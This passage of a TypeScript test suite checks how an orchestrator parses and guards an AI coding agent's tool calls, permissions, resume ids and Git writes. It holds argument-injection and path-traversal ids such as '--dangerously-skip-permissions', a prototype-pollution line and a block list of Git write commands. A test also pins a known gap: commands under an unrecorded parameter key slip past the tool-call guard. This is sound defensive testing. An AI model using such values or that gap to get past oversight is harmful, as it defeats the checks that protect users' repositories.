      source: "provider_reported",
      metrics: { total_tokens: 24 },
    });
    expect(r.result).toMatchObject({ ok: true });
    const negative = parse([INIT, RESULT({ usage: { total_tokens: -1 } })]);
    expect(negative.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const usageNotObject = parse([INIT, RESULT({ usage: [24] })]);
    expect(usageNotObject.result).toMatchObject({ ok: false });
  });

  it("a tool step is reported once; a later update that names a new command or path is reported for the guard", () => {
    const late = parse([
      INIT,
      TOOL(3, "ACTIVE"),
      TOOL(3, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      TOOL(3, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      RESULT(),
    ]);
    expect(late.events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
    ]);
    const early = parse([
      INIT,
      TOOL(4, "ACTIVE", { name: "write_to_file", parameters: { path: "/work/tree/a.txt" } }),
      TOOL(4, "DONE", { name: "write_to_file", parameters: { path: "/elsewhere" } }),
      TOOL(4, "DONE"),
      RESULT(),
    ]);
    // A later update that swaps the path (or command) is reported too, so it cannot hide an unchecked one; repeats
    // and updates without parameters add nothing.
    expect(early.events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "write_to_file", target: "/work/tree/a.txt" },
      { kind: "tool_call", tool: "other", name: "write_to_file", target: "/elsewhere" },
    ]);
    const swapped = parse([
      INIT,
      TOOL(5, "ACTIVE", { name: "run_command", parameters: { command: "ls" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "ls" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      RESULT(),
    ]);
    const commands = swapped.events.flatMap((e) => (e.kind === "tool_call" ? [e.command] : []));
    expect(commands).toEqual(["ls", "git push origin main"]);
    // Steps are keyed per run: a new parse state starts with no seen steps.
    expect(
      parse([INIT, TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "ls" } })]).events,
    ).toContainEqual({
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      command: "ls",
    });
  });

  it("a conversation id that is not one safe token binds nothing and fails the run; an empty id binds nothing", () => {
    for (const id of ["-c", "--dangerously-skip-permissions", "a b", "x\ny", "../x", "x".repeat(257)]) {
      const r = parse([j({ event: "init", conversation_id: id, init: {} }), RESULT({ conversation_id: id })]);
      expect(r.state.nativeSessionId, id).toBeUndefined();
      expect(
        r.events.some((e) => e.kind === "session_bound"),
        id,
      ).toBe(false);
      expect(r.result, id).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
      expect(r.result, id).not.toHaveProperty("nativeSessionId");
    }
    // Recorded shapes: an empty id (C6, C10) binds nothing and is no anomaly; a later UUID still binds.
    const late = parse([j({ event: "init", conversation_id: "", init: {} }), RESULT()]);
    expect(late.result).toMatchObject({ ok: true, nativeSessionId: CID });
  });

  it("status and event names are matched exactly; SUCCESS without total_tokens is not a success (Q-86)", () => {
    for (const status of ["success", "Success", " SUCCESS", "SUCCESS "]) {
      expect(parse([INIT, RESULT({ status })]).result, status).toMatchObject({
        ok: false,
        failureCode: "TOOL_FAILURE",
      });
    }
    const noTotal = parse([INIT, RESULT({ usage: { input_tokens: 20, output_tokens: 3 } })]);
    expect(noTotal.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const r = parse([INIT, j({ event: "Result", result: { status: "SUCCESS", usage: USAGE } })]);
    expect(r.state.unknownEvents).toBe(1);
    expect(r.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("a tool step after the result line still reaches the guard", () => {
    const { events } = parse([
      INIT,
      RESULT(),
      TOOL(9, "ACTIVE", { name: "run_command", parameters: { command: "git push origin main" } }),
    ]);
    expect(events.at(-1)).toEqual({
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      command: "git push origin main",
    });
  });

  it("pins the Assumption gap: a command under an unrecorded parameter key or of another type is not seen", () => {
    // The live check recorded `tool_info.parameters` but not its keys (T4.33 "Not done" (3)). These reports carry no
    // command, so the tool-call guard cannot flag them and FR-GIT-03 and FR-GIT-06 remain; a capture replaces this test.
    const { events, result } = parse([
      INIT,
      TOOL(6, "ACTIVE", { name: "run_command", parameters: { cmd: "git push origin main" } }),
      TOOL(7, "ACTIVE", { name: "run_command", parameters: { command: ["git", "push"] } }),
      TOOL(8, "ACTIVE", { name: "run_command", parameters: "git push origin main" }),
      RESULT(),
    ]);
    expect(events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "other", name: "run_command" },
    ]);
    expect(result).toMatchObject({ ok: true });
  });

  it("pins the gap: init.permission_mode is not read, so it never changes the outcome", () => {
    // Recorded: `request-review` ([LIVE] C7b, C18); [H] documents `always-proceed` under the bypass flag. Whether a
    // mismatch with the compiled flag should fail the run is not decided; the outcome rests on the result envelope.
    for (const mode of ["always-proceed", "request-review", "brand-new", undefined]) {
      const init = j({
        event: "init",
        conversation_id: CID,
        init: mode === undefined ? {} : { permission_mode: mode },
      });
      expect(parse([init, RESULT()]).result, String(mode)).toMatchObject({ ok: true, nativeSessionId: CID });
    }
  });

  it("malformed step and init lines are unknown and counted; non-object roots and arrays never bind or succeed", () => {
    const { state, events, result } = parse([
      j({ event: "step_update", step_type: "tool", step_index: "1" }),
      j({ event: "step_update", step_index: 1 }),
      j({ event: "init", conversation_id: 7, init: {} }),
      j({ event: "init", conversation_id: CID, init: [] }),
      j({ event: 1 }),
      j({ event: "result", result: { status: 200 } }),
      j({ event: "result", result: "SUCCESS" }),
      "[]",
      "null",
      '"result"',
      "42",
    ]);
    expect(state.unknownEvents).toBe(11);
    expect(events.every((e) => e.kind === "unknown")).toBe(true);
    expect(state.nativeSessionId).toBeUndefined();
    expect(result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR", unknownEventCount: 11 });
  });

  it("a __proto__ key in a line changes nothing outside the parsed document", () => {
    const { result } = parse([INIT, '{"event":"result","__proto__":{"polluted":1},"result":{"status":"ERROR"}}']);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(result).toMatchObject({ ok: false });
  });

  it("ACP messages are ignored (no ACP transport)", () => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    expect(a.parseEvent({ jsonrpc: "2.0", method: "session/update" } as never, state)).toEqual([]);
    expect(state.lines).toBe(0);
  });

  it("resume stays Ineligible for every profile and binding id, never throws and never emits --conversation", () => {
    const approved = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    const profiles: ResolvedProfile[] = [...PROFILES.map(profileOf), approved, privilegedProfile(BYPASS_SCOPE)];
    for (const profile of profiles) {
      for (const nativeSessionId of [CID, "", "--dangerously-skip-permissions", "-c", "../x", "a b"]) {
        const label = `${profile.name}:${nativeSessionId}`;
        const r = adapter().resumeArgs(
          { provider: "antigravity", nativeSessionId },
          request({ bypassApproved: profile.bypassApproved }),
          profile,
        );
        expect(r, label).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
        expect("ineligible" in r && r.detail.length > 0, label).toBe(true);
      }
    }
    expect(compiled().argv.some((a) => a.startsWith("--conversation") || a.startsWith("-conversation"))).toBe(false);
  });

  it("resume is not compiled (Q-86): an unknown --conversation id silently starts a new conversation", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    expect(
      adapter().resumeArgs(
        { provider: "antigravity", nativeSessionId: CID },
        request({ bypassApproved: true }),
        profile,
      ),
    ).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING", detail: expect.stringContaining("Q-86") });
    expect(
      adapter().resumeArgs({ provider: "codex", nativeSessionId: CID }, request({ bypassApproved: true }), profile),
    ).toMatchObject({ reason: "CAPABILITY_MISSING", detail: "binding is for codex" });
  });
});

/**
 * T4.35 (FR-ADP-11): the shared conformance suite over synthetic recorded fixtures (`./fixtures/*.jsonl`, in the
 * `stream-json` shapes of the 2026-10-14 live check), replayed by `replay.mjs --provider antigravity` in place of the
 * binary, so it passes with no `agy` installed. The prompt reaches the replay as the `--prompt=` argv word. The
 * `resume` case fails closed while `resumeArgs` is Ineligible (Q-86), so it is asserted apart from the suite.
 */
describe("antigravity conformance suite (synthetic recorded fixtures, FR-ADP-11, T4.35)", () => {
  const caseOf = (kind: ConformanceCase["kind"]): ConformanceCase => {
    const c = antigravityConformanceCases(makeCwd).find((x) => x.kind === kind);
    if (!c) throw new Error(`missing ${kind} case`);
    return c;
  };
  const shapeRequest = (): CompileRequest => ({
    runId: "run_antigravity_shape",
    objective: "synthetic antigravity objective",
    constraints: [],
    workspace: { cwd: makeCwd(), writable: true },
    bypassApproved: true,
  });
  /**
   * `a` with `compile` replaced. A Proxy that binds every other method to `a`, because the adapter's private `#`
   * members throw on an `Object.create` copy (the run would end `OUTPUT_PROTOCOL_ERROR` for that reason alone).
   */
  const withCompile = (a: AntigravityAdapter, compile: AntigravityAdapter["compile"]): AntigravityAdapter =>
    new Proxy(a, {
      get(target, key) {
        if (key === "compile") return compile;
        const v: unknown = Reflect.get(target, key, target);
        return typeof v === "function" ? v.bind(target) : v;
      },
    });
  /** A copy of `a` whose compiled invocation is rewritten by `edit`, to show the replay refuses a wrong compile. */
  const brokenBy = (a: AntigravityAdapter, edit: (inv: Invocation) => Invocation): AntigravityAdapter =>
    withCompile(a, (r, p) => {
      const inv = a.compile(r, p);
      if ("ineligible" in inv) return inv;
      return { ...edit(inv), policyFlags: [] };
    });

  it("names every FR-ADP-11 kind and passes the suite for every kind except resume", async () => {
    const cases = antigravityConformanceCases(makeCwd);
    expect(missingRequiredKinds(cases)).toEqual([]);
    const runnable = cases.filter((c) => ANTIGRAVITY_RUNNABLE_KINDS.includes(c.kind));
    expect(new Set(runnable.map((c) => c.kind))).toEqual(new Set(ANTIGRAVITY_RUNNABLE_KINDS));
    const report = await runConformanceSuite(runnable);
    const failing = report.cases.flatMap((c) =>
      c.checks.filter((k) => !k.ok).map((k) => `${c.kind}: ${k.name} ${k.detail ?? ""}`),
    );
    expect(failing).toEqual([]);
    expect(report.ok).toBe(true);
  });

  it("resume fails closed: the case does not compile while resumeArgs is Ineligible (Q-86)", async () => {
    const report = await runConformanceCase(caseOf("resume"));
    expect(report.ok).toBe(false);
    expect(report.result).toBeUndefined();
    expect(report.checks).toEqual([{ name: "compiles", ok: false, detail: "ineligible: CAPABILITY_MISSING" }]);
  });

  it("the resume fixture and dialect keep the --conversation id, ready for when Q-86 allows a compile", async () => {
    const { binding: _binding, ...c } = caseOf("resume");
    const withId = withCompile(c.adapter as AntigravityAdapter, (r, p) => {
      const inv = c.adapter.compile(r, p);
      return "ineligible" in inv ? inv : { ...inv, argv: [...inv.argv, "--conversation", RESUMED_SESSION_ID] };
    });
    const report = await runConformanceCase({ ...c, adapter: withId });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: RESUMED_SESSION_ID });
    // Without the id the replay refuses the resume fixture (requireResume), so it cannot pass as a fresh run.
    const fresh = await runConformanceCase(c);
    expect(fresh.result).toMatchObject({ ok: false, failureDetail: "exit code 64" });
  });

  it("success with edit normalizes conversation id, summary and the edit; usage is provider_reported", async () => {
    const c = caseOf("success");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({
      ok: true,
      nativeSessionId: DEFAULT_SESSION_ID,
      summary: "Added hello.txt.",
      unknownEventCount: 0,
    });
    expect(readFileSync(join(c.request.workspace.cwd, "hello.txt"), "utf8")).toContain("synthetic");
  });

  it("SUCCESS with zero tokens at exit 0 (live check C10, Q-86) is TOOL_FAILURE and keeps the conversation id", async () => {
    const report = await runConformanceCase(caseOf("task_failure"));
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a soft-denied shell command at exit 0 (live check C7) is PERMISSION_BLOCKED", async () => {
    const c = antigravityConformanceCases(makeCwd).find((x) => x.expect.failureCode === "PERMISSION_BLOCKED");
    if (!c) throw new Error("missing permission_denied case");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a logged-out ERROR envelope at exit 1 (live check C13) ends AUTH_REQUIRED, not a success", async () => {
    const report = await runConformanceCase(caseOf("auth_missing"));
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({ ok: false, failureCode: "AUTH_REQUIRED" });
  });

  /** The first case whose expectation matches `pick` (several cases share a kind). */
  const caseWhere = (name: string, pick: (e: ConformanceCase["expect"]) => boolean): ConformanceCase => {
    const c = antigravityConformanceCases(makeCwd).find((x) => pick(x.expect));
    if (!c) throw new Error(`missing ${name} case`);
    return c;
  };

  it("an invalid model ERROR envelope at exit 1 (live check C10) is MODEL_UNAVAILABLE and binds no session", async () => {
    const report = await runConformanceCase(
      caseWhere("model_unavailable", (e) => e.failureCode === "MODEL_UNAVAILABLE"),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "MODEL_UNAVAILABLE" });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a slash-command SUCCESS envelope with no turn (live check C6) is TOOL_FAILURE; its command key is ignored", async () => {
    const report = await runConformanceCase(
      caseWhere(
        "slash_command",
        (e) => e.failureCode === "TOOL_FAILURE" && e.nativeSessionId === undefined && !e.mutatedPath,
      ),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a write before a soft-denied command (live check C18 run 2) is PERMISSION_BLOCKED and the write stays", async () => {
    const c = caseWhere("denied_after_write", (e) => e.mutatedPath === "b.txt");
    const report = await runConformanceCase(c);
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(readFileSync(join(c.request.workspace.cwd, "b.txt"), "utf8")).toContain("synthetic");
  });

  /** The one case that replays `fixture` (several cases share a kind and an expectation). */
  const caseFor = (fixture: string): ConformanceCase => {
    const want = fixturePath(fixture);
    const c = antigravityConformanceCases(makeCwd).find((x) => {
      const inv = x.adapter.compile(x.request, x.profile);
      return !("ineligible" in inv) && inv.argv.includes(want);
    });
    if (!c) throw new Error(`missing ${fixture} case`);
    return c;
  };

  it("a /credits SUCCESS envelope with no turn (live check C6) is TOOL_FAILURE and binds no session", async () => {
    const report = await runConformanceCase(caseFor("credits_command"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it.each([
    ["a stream with no result line at exit 0", "no_result", "no result event"],
    ["a second, successful result after a C10 zero-token one", "two_results", "protocol: more than one result line"],
    ["a result for another conversation", "conversation_changed", "protocol: conversation id changed mid-run"],
  ])("%s is OUTPUT_PROTOCOL_ERROR and keeps the first conversation id", async (_n, fixture, detail) => {
    const report = await runConformanceCase(caseFor(fixture));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: detail,
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a SUCCESS envelope with tokens at exit 1 is TOOL_FAILURE and the write stays: the exit code is not overridden", async () => {
    const c = caseWhere("success_exit_1", (e) => e.mutatedPath === "hello.txt" && !e.ok);
    const report = await runConformanceCase(c);
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
    expect(readFileSync(join(c.request.workspace.cwd, "hello.txt"), "utf8")).toContain("synthetic");
  });

  it("an unrecorded event kind in a success is counted as unknown and does not change the result", async () => {
    const report = await runConformanceCase(caseFor("unknown_event"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: DEFAULT_SESSION_ID, unknownEventCount: 1 });
  });

  it("partial mutation leaves the file in the cwd", async () => {
    const c = caseOf("partial_mutation");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(readFileSync(join(c.request.workspace.cwd, "partial.txt"), "utf8")).toContain("synthetic");
  });

  it("positive control: the same wrapper with the compile unchanged passes, so each refusal below is the replay's", async () => {
    const report = await runConformanceCase({
      kind: "success",
      adapter: brokenBy(replayAdapter("success_edit"), (inv) => ({ ...inv, policyFlags: inv.policyFlags })),
      request: shapeRequest(),
      profile: PRIVILEGED_BYPASS_PROFILE,
      expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
  });

  const argvEdit =
    (edit: (argv: string[]) => string[]) =>
    (inv: Invocation): Invocation => ({ ...inv, argv: edit(inv.argv) });
  it.each([
    [
      "--dangerously-skip-permissions removed",
      argvEdit((a) => a.filter((w) => w !== "--dangerously-skip-permissions")),
    ],
    ["--prompt= removed", argvEdit((a) => a.filter((w) => !w.startsWith("--prompt=")))],
    ["--sandbox added", argvEdit((a) => [...a, "--sandbox"])],
    ["--model added", argvEdit((a) => [...a, "--model", "synthetic-model"])],
    ["--continue added", argvEdit((a) => [...a, "--continue"])],
    ["-dangerously-skip-permissions added", argvEdit((a) => [...a, "-dangerously-skip-permissions"])],
    ["--gemini_dir= added", argvEdit((a) => [...a, "--gemini_dir=/tmp/synthetic"])],
    ["auto-update not disabled", (inv: Invocation): Invocation => ({ ...inv, env: {} })],
    [
      "GEMINI_API_KEY in the environment",
      (inv: Invocation): Invocation => ({
        ...inv,
        env: { ...inv.env, GEMINI_API_KEY: "synthetic-not-a-key" },
        envAllowlist: [...inv.envAllowlist, "GEMINI_API_KEY"],
      }),
    ],
  ])(
    "the replay refuses an invocation agy would not be given (%s), so a wrong compile cannot pass",
    async (_n, edit) => {
      const report = await runConformanceCase({
        kind: "success",
        adapter: brokenBy(replayAdapter("success_edit"), edit),
        request: shapeRequest(),
        profile: PRIVILEGED_BYPASS_PROFILE,
        expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
      });
      expect(report.ok).toBe(false);
      expect(report.result?.ok).toBe(false);
      expect(report.result?.failureDetail).toBe("exit code 64");
    },
  );
});

describe("antigravity Git declaration (T4.37, FR-GIT-01, FR-GIT-02, FR-GIT-09)", () => {
  it("declares no per-run Git write control (deny rules are settings only), leaving FR-GIT-03 and FR-GIT-06", () => {
    const c = adapter().gitWriteControl;
    expect(c.kind).toBe("none-documented");
    expect(c.remainingControls).toEqual(["FR-GIT-03", "FR-GIT-06"]);
    expect(c.detail).toBe(GIT_WRITE_CONTROL_DETAIL);
    expect(c.detail).toMatch(/settings\.json/);
    expect(c.detail).toMatch(/none per run/);
    expect(c.detail).toMatch(/FR-GIT-03/);
    expect(c.detail).toMatch(/FR-GIT-06/);
    expect(adapter().gitWriteControl).toBe(ANTIGRAVITY_GIT_WRITE_CONTROL);
  });

  it("declares finalize-only commit channel (FR-GIT-09, owner decision 36)", () => {
    const caps = adapter().gitCapabilities;
    expect(caps.commitChannel).toBe("finalize-only");
    expect(caps.detail).toMatch(/FR-GIT-09/);
    expect(caps.detail).toMatch(/mcp_config\.json/);
    expect(adapter().gitCapabilities).toBe(ANTIGRAVITY_GIT_CAPABILITIES);
  });

  it("list_capabilities reports Antigravity's Git-write declaration through MCP", async () => {
    const root = realpathSync(makeCwd());
    const dataDir = join(root, "data");
    mkdirSync(dataDir);
    const db = openLedger(dataDir);
    const ids = createIdGenerator();
    const ledger = createLedger(db, { ids });
    const artifacts = new ArtifactStore(join(dataDir, "artifacts"));
    const registry = new AdapterRegistry().register(adapter());
    const real = createProbeRunner();
    const probeRunner: ProbeRunner = async (argv, opts) =>
      argv[0] === process.execPath
        ? real(argv, opts)
        : { exitCode: null, stdout: "", stderr: "", timedOut: false, spawnError: "refused in tests" };
    const lifecycle = new RunLifecycle({
      ledger,
      workspace: new WorkspaceManager({ db, artifacts, dataDir, allowedRoots: [root], ids }),
      artifacts,
      adapters: registry,
      allowedRoots: [root],
      globalConcurrency: 1,
      resolveProfile: (name) => resolveTrustProfile(name),
      probeRunner,
      eligibility: { platform: "linux", gate: (id, v, dir) => registry.gate(id, v, dir) },
    });
    const mcp = createSwitchboardServer({
      lifecycle,
      ledger,
      artifacts,
      registry,
      config: {
        allowedRoots: [root],
        projects: [],
        mcpClients: new Map([["c1", { id: "c1", maxTrustProfile: "edit-untrusted" as const }]]),
      },
      clientId: "c1",
    });
    const client = new Client({ name: "test-client", version: "0.0.0" });
    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    try {
      await mcp.server.connect(serverSide);
      await client.connect(clientSide);
      const res = await client.callTool({ name: "list_capabilities", arguments: {} });
      const body = JSON.parse((res.content as { text: string }[])[0]?.text ?? "{}");
      const agy = body.providers.find((p: { provider: string }) => p.provider === "antigravity");
      expect(agy).toBeDefined();
      expect(agy.git_write_control).toEqual({
        kind: "none-documented",
        detail: GIT_WRITE_CONTROL_DETAIL,
        remaining_controls: ["FR-GIT-03", "FR-GIT-06"],
      });
    } finally {
      await client.close();
      await mcp.close();
      await lifecycle.shutdown();
      db.close();
    }
  });

  it("the compiled invocation passes the prompt as one --prompt= word and carries no git command or credentials", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    const inv = adapter().compile(request({ bypassApproved: true }), profile);
    if (isIneligible(inv)) throw new Error(`unexpected ineligible: ${inv.detail}`);
    expect(inv.argv).toContain("--prompt=--sandbox fix the failing test");
    expect(inv.stdin).toEqual({ kind: "none" });
    expect(auditInvocation(inv, { profile, bypassApproved: true })).toEqual([]);
    for (const a of inv.argv.slice(1)) expect(/\bgit\b|\bgh\b/.test(a), `argv has git: ${a}`).toBe(false);
    for (const a of inv.policyFlags) expect(/\bgit\b|\bgh\b/.test(a), `policyFlags has git: ${a}`).toBe(false);
    expect(inv.envAllowlist).toEqual(["PATH", "HOME"]);
    for (const k of Object.keys(inv.env)) {
      expect(/GIT|GITHUB|GH_|GEMINI|GOOGLE/.test(k), `env: ${k}`).toBe(false);
    }
  });

  it.each([
    "git commit",
    "git commit -m x",
    "git push",
    "git push origin main",
    "git branch -f main",
    "git update-ref refs/heads/x HEAD",
    "git tag v1",
    "gh pr create",
    "git reset --hard",
    "git merge x",
    "git rebase main",
    "git cherry-pick abc",
    "git stash",
    "git -C . commit",
    "git --git-dir=/repo/.git commit",
    "/usr/bin/git push",
    "env git commit",
    "xargs git push",
  ])("shell allowlist entry %j is Ineligible (PROFILE_UNSUPPORTED, FR-GIT-01)", (entry) => {
    const r1 = adapter().compile(request(), { ...profileOf("edit-untrusted"), shellAllowlist: [entry] });
    expect(r1).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r1)) {
      expect(r1.detail).toContain("FR-GIT-01");
      expect(r1.detail).toContain(entry);
    }

    const r2 = adapter().compile(request({ bypassApproved: true }), {
      ...privilegedProfile(BYPASS_SCOPE),
      bypassApproved: true,
      shellAllowlist: [entry],
    });
    expect(r2).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r2)) {
      expect(r2.detail).toContain("FR-GIT-01");
      expect(r2.detail).toContain(entry);
    }
  });

  it("read-only commands in a shell allowlist do not trigger the FR-GIT-01 rejection", () => {
    const r = adapter().compile(request(), {
      ...profileOf("edit-untrusted"),
      shellAllowlist: ["git status", "git diff", "npm test"],
    });
    expect(r).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r)) {
      expect(r.detail).not.toContain("FR-GIT-01");
      expect(r.detail).toContain(NON_PRIVILEGED_UNSUPPORTED_DETAIL);
    }
    const ok = adapter().compile(request({ bypassApproved: true }), {
      ...privilegedProfile(BYPASS_SCOPE),
      bypassApproved: true,
      shellAllowlist: ["git status", "git diff", "npm test"],
    });
    expect(isIneligible(ok)).toBe(false);
  });

  it("a replayed write run in a finalize-only project gets the controller commit at FINALIZING", async () => {
    const root = realpathSync(makeCwd());
    const repo = join(root, "repo");
    const bare = join(root, "remote.git");
    mkdirSync(repo);
    const g = (cwd: string, ...args: string[]) =>
      execFileSync("git", ["-c", "commit.gpgsign=false", ...args], {
        cwd,
        env: {
          PATH: process.env.PATH ?? "",
          GIT_CONFIG_GLOBAL: "/dev/null",
          GIT_CONFIG_NOSYSTEM: "1",
          GIT_AUTHOR_NAME: "Antigravity Dev",
          GIT_AUTHOR_EMAIL: "antigravity@example.test",
          GIT_COMMITTER_NAME: "Antigravity Dev",
          GIT_COMMITTER_EMAIL: "antigravity@example.test",
        },
        encoding: "utf8",
      }).trim();

    g(repo, "init", "-q", "-b", "main");
    writeFileSync(join(repo, "README.md"), "initial\n");
    g(repo, "add", "-A");
    g(repo, "commit", "-q", "-m", "init");
    g(root, "init", "-q", "--bare", "-b", "main", bare);
    g(repo, "remote", "add", "origin", bare);
    g(repo, "push", "-q", "origin", "main");

    const dataDir = join(root, "data");
    mkdirSync(dataDir);
    const db = openLedger(dataDir);
    const ids = createIdGenerator();
    const ledger = createLedger(db, { ids });
    const artifacts = new ArtifactStore(join(dataDir, "artifacts"));
    const workspace = new WorkspaceManager({ db, artifacts, dataDir, allowedRoots: [root], ids });
    const finalizePublisher = new GitPublisher({
      db,
      scratchDir: join(dataDir, "git-scratch"),
      allowedStates: ["FINALIZING"],
    });
    // The replay dialect answers `--version` and `--help` only; `agy models` gets model lines in the observed shape
    // (T4.34, live check C3b).
    const real = createProbeRunner();
    const probeRunner: ProbeRunner = async (argv, opts) =>
      argv.at(-1) === AUTH_STATUS_ARGS.at(-1)
        ? { exitCode: 0, stdout: "m-flash\tModel Flash\n", stderr: "", timedOut: false }
        : real(argv, opts);
    const lifecycle = new RunLifecycle({
      ledger,
      workspace,
      artifacts,
      adapters: new AdapterRegistry().register(replayAdapter("success_edit")),
      allowedRoots: [root],
      globalConcurrency: 1,
      resolveProfile: (name) => resolveTrustProfile(name),
      probeRunner,
      finalizePublisher,
    });
    lifecycle.start();

    try {
      const { runId, metaSessionId } = await lifecycle.submit({
        clientId: "c",
        objective: "write a file with antigravity",
        workspace: repo,
        trustProfile: "privileged",
        provider: "antigravity",
        project: {
          id: "test-project",
          name: "Test Project",
          environment_kind: "host",
          context_id: "primary",
          base_ref: "main",
          effective_max_profile: "privileged",
          writable: true,
          identity: { name: "Antigravity Dev", email: "antigravity@example.test" },
          push: { policy: "branch" },
          finalize_commit: true,
        },
        privileged: {
          scope: BYPASS_SCOPE,
          approvedByClientPolicy: true,
        },
      });

      const done = await lifecycle.waitForTerminal(runId);
      expect(done.state, done.failure_detail ?? "").toBe("SUCCEEDED");

      const events = ledger.listRunEvents(runId).map((e) => ({ type: e.type, p: JSON.parse(e.payload_json) }));
      expect(events.find((e) => e.type === "state_transition" && e.p.to === "FINALIZING")).toBeDefined();
      const finCommit = events.find((e) => e.type === GIT_FINALIZE_COMMIT_EVENT);
      expect(finCommit?.p).toMatchObject({ outcome: "committed" });

      const sha = g(repo, "rev-parse", "--verify", "--quiet", publishRefFor(metaSessionId));
      expect(sha).toMatch(/^[0-9a-f]{40}$/u);
      expect(g(repo, "show", "--name-only", "--format=", sha)).toContain("hello.txt");
    } finally {
      await lifecycle.shutdown();
      db.close();
    }
  });
});

describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-POL-06; SYNTHETIC lines)", () => {
  // The shared leg is test/malicious/adapters/antigravity.case.ts; these pin what is specific to Antigravity.
  const CID = "0b6c2d1e-0000-4000-8000-0000000000bb";
  const HOME = "/home/synthetic";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const tool = (name: string, parameters: Record<string, string>) =>
    j({
      event: "step_update",
      conversation_id: CID,
      step_index: 1,
      state: "ACTIVE",
      step_type: "tool",
      tool_name: name,
      tool_info: { name, parameters },
    });
  const result = (over: Record<string, unknown> = {}) =>
    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "", usage: USAGE, ...over } });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  /** Lines through the parser and the tool-call guard as an approved bypass run sees them, then the result. */
  const run = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const ctx = { cwd: "/work/tree", home: HOME, bypass: true };
    const events = lines.flatMap((l) => a.parseEvent(l, state)).map((e) => guardEvent(e, ctx));
    return { events, result: a.extractResult(events, EXIT0) };
  };

  it.each(["disabled", "approved"] as const)(
    "repository_config %s is refused, never compiled as enabled (FR-POL-04 is not shown; live check C11)",
    (mode) => {
      const profile = { ...privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode } }), bypassApproved: true };
      const r = adapter().compile(request({ bypassApproved: true }), profile);
      expect(r).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
      if ("ineligible" in r) expect(r.detail).toContain("C11");
    },
  );

